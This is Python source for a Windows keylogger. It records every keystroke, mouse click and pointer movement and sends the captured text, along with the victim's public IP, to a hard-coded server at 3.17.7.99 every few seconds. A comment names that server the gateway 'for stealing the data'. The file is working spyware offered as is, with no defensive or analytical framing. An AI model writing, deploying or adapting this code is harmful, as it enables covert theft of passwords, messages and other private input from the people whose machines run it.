#Written by Eshed Sorotsky & Shilat Tsfoni

from asyncio.windows_events import NULL
from multiprocessing.connection import Listener
from wsgiref import headers
import win32console
import requests
import datetime
from pynput import mouse,keyboard
import string
import random
import time
import threading
import os

#creates a random key
def key_generator(size= 10, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
#getting the current window the app is running
myWindow = win32console.GetConsoleWindow()
#variable holding the global current x,y
currentX =0
currntY=0
#variable holding the global bul
bul = True
#variable holding the global stream
dataStream = ""
#api gateway for stealing the data
apiUrl = 'http://3.17.7.99/api/sendData/'
#api gateway for key
apiKeyUrl= 'http://3.17.7.99/api/secretkey/'
#getting the current pc's IP
ip = requests.get(r'http://jsonip.com').json()['ip']
key = key_generator()
keyTime = datetime.datetime.now()
#sends data using the API gateway
id = requests.post(url=apiKeyUrl, data={'key':key, 'source':ip}).json()['id']
#checks time and ip 
def checkCondition():
    global id, keyTime, ip, key
    curr_time = datetime.datetime.now()
    #checks the ip
    if ip != requests.get(r'http://jsonip.com').json()['ip']:
        ip= requests.get(r'http://jsonip.com').json()['ip']
    #creats new key every 300 seconds
    if (curr_time - keyTime).seconds >=300:
        key = key_generator()
        response = requests.put(url='{0}{1}/'.format(apiKeyUrl,id), data={'key':key, 'source':ip})
    #if it hits 15 seconds activates sendData and resets the timer
    if len(dataStream) > 15:
        sendData()
#activates the checkCondition every 10 seconds
def threadFunc():
    while(bul):
        time.sleep(10)
        checkCondition()
    return bul
#sends data using the API gateway
def sendData():
    global dataStream
    global apiUrl
    global ip
    def jParse(data):
        return {'source':ip,
        'stream':data,
        }
    request = requests.post(url = apiUrl,data = jParse(dataStream))
    #resets the datastream after every post made to the server
    dataStream = ""
#parses the mouse click event and adds it to the datastream
def on_move(x,y):
    global dataStream
    global currentX, currentY
    if abs(currentX-x) >=50 or abs(currentY-y)>=50:
        currentX = x
        currentY = y
        mouseLog = 'Pointer moved to {0}'.format((x,y))
        dataStream +='\n'+mouseLog
    return bul
#parses the mouse click event and adds it to the datastream
def mouseClick(x,y,event,pressed):
    global dataStream 
    currentLen = len(dataStream)
    if event == mouse.Button.left:
        mouseLog='left {0} at {1}'.format('Pressed' if pressed else 'Released', (x,y))   
    if event == mouse.Button.right:
        mouseLog='right {0} at {1}'.format('Pressed' if pressed else 'Released', (x,y))
    if event == mouse.Button.middle:
        mouseLog= 'middle {0} at {1}'.format('Pressed' if pressed else 'Released', (x,y))
    dataStream +='\n'+mouseLog
    return bul   
#parses the keystroke event and adds it to the datastream
def keyStrokes(event):
    global dataStream
    global key
    currentLen = len(dataStream)
    #normal alphanumeric keys
    try:
        dataStream += ('{0}'.format(event.char))
    #special keys
    except AttributeError:
        dataStream += (' \n special key {0} pressed \n'.format(event))
    return True
#releases a key
def on_release_keyboard(event):
    global key, dataStream
    global bul
    if dataStream.find(key) != -1:
        os._exit
        bul = False
    return bul

#listener for keyboard events
keyboardListener = keyboard.Listener(on_press=keyStrokes,on_release=on_release_keyboard)
#listener for mouse events
mouseListener = mouse.Listener(on_click=mouseClick,on_move=on_move)
#start the keyboardListener’s activity
keyboardListener.start()
#start the mouseListener’s activity
mouseListener.start()
dataSend= threading.Thread(target=threadFunc)
#start the dataSend’s activity
dataSend.start()
#collect events until released
keyboardListener.join()
mouseListener.join()
dataSend.join()

